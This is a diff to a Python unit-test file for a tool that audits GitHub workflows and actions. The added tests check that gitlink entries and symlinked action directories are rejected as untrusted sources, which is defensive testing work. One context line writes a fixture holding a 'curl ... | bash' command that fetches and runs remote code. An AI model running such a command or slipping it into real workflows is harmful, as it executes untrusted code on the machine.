@@ -221,6 +221,23 @@ class RatchetTests(unittest.TestCase):
         doc.write_text("run: curl https://example.invalid/i | bash\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).candidate_findings, 0)
 
+    def test_local_action_gitlink_is_untrusted_source(self):
+        # Create a genuine mode-160000 Git tree entry without cloning a submodule.
+        call(self.repo, "update-index", "--add", "--cacheinfo",
+             f"160000,{self.base},.github/actions/untrusted")
+        call(self.repo, "commit", "-qm", "insert gitlink")
+        head = call(self.repo, "rev-parse", "HEAD")
+        with self.assertRaises(mod.SourceError):
+            mod.audit(self.repo, self.base, head)
+
+    def test_workflow_submodule_entry_is_untrusted_source(self):
+        call(self.repo, "update-index", "--add", "--cacheinfo",
+             f"160000,{self.base},.github/workflows/helper")
+        call(self.repo, "commit", "-qm", "insert workflow gitlink")
+        head = call(self.repo, "rev-parse", "HEAD")
+        with self.assertRaises(mod.SourceError):
+            mod.audit(self.repo, self.base, head)
+
     def test_exact_actions_directory_symlink_is_rejected(self):
         actions_dir = self.repo / ".github" / "actions"
         actions_dir.symlink_to("/tmp/actions-untrusted")
